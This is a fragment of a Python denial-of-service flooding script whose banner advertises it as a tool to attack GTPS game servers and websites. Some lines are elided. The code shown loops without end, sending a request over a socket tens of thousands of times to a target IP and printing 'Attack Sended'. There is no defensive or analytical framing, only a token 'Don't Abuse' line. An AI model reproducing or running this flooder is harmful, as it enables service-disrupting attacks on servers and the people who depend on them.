...
print("[+]Tools Ddos Super Strongz")
print("[+]Tools Created By iNatzzuGanz")
print("[+]Don`t Abuse This Tools")
print("")
print("[+]iNatzzu Tools Ddos")
print("[+]This Tool Supported To Attack GTPS & Web")
print("[+]Don`t Leak")
    ...
    while True:
        try:
            ...
            for x in range(60000):
                ...
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
            print("Attack Sended " + ip)
        except :
            print(" Ddos Attack Sucesfull Sended to " + ip)
